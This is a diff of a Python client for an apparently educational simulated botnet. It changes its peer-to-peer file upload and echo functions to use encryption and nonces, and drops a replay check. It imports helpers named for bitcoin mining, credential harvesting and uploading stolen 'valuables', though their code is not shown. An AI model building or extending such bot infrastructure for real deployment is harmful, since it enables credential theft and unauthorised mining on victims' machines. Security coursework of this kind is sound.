@@ -1,52 +1,42 @@
 import socket
 import time
 import threading
-
 from lib.evil import bitcoin_mine, harvest_user_pass
 from lib.p2p import find_bot, bot_server
 from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, valuables
+
+
 def p2p_upload(fn):
     # Check if the file exists before sending empty
     if fn not in filestore:
         print("That file doesn't exist in the botnet's filestore")
         return
     sconn = find_bot()
-    sconn.send(bytes("FILE", "ascii"))
+    sconn.send(bytes("FILE", "ascii"), crypto=True)
     p2p_upload_file(sconn, fn)
+
 
 def p2p_echo():
     try:
         sconn = find_bot()
         # Set verbose to true so we can view the encoded packets
         sconn.verbose = True
-        sconn.send(bytes("ECHO", "ascii"))
-        list=[]
-        i=0
+        sconn.verbose2 = False
+        sconn.send(bytes("ECHO", "ascii"), crypto=True)
         while 1:
             # Read a message and send it to the other bot
-            nonce = sconn.recv()
-            if i!=0:
-                if nonce == b'':
-                    print("nonce error")
-                    sconn.close()
-            # if i==0 or (i>0 and list[i-1]!=nonce):
+            nonce = sconn.recv(crypto=False)
+            print("The next nonce is {}".format(nonce))
             msg = input("Echo> ")
             byte_msg = bytes(msg, "ascii")
-            sconn.send(byte_msg)
-            # This other bot should echo it back to us
-            echo = sconn.recv()
-            # Ensure that what we sent is what we got back
-            # print("echo::",echo)
-            # print("byte_msg::",byte_msg)
-            assert(echo == byte_msg)
+            sconn.send(byte_msg, crypto=True, nonce=nonce)
             # If the msg is X, then terminate the connection
-            if msg.lower() == 'x' or msg.lower() == "exit" or msg.lower() == "quit" or msg.lower()=="replayattck":
+            if byte_msg == b'X' or msg.lower() == "exit" or msg.lower() == "quit":
                 sconn.close()
                 break
-            list.append(nonce)
-            i+=1
     except socket.error:
         print("Connection closed unexpectedly")
+
 
 if __name__ == "__main__":
     # Start a new thread to accept P2P echo or P2P upload requests
